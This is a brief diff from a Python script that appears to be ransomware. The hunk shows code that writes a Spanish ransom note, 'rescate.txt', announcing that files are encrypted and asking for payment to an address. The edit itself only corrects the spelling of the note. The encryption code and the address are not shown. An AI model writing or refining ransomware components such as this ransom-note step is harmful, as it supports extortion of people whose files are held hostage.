@@ -30,4 +30,4 @@ if __name__ == '__main__':
 
     with open(path_to_encrypt+'\\'+'rescate.txt', 'w') as file:
         file.write('Ficheros encriptados- \n')
-        file.write('realizar pago a la siguiente direcicon')
+        file.write('Realizar pago a la siguiente dirección')
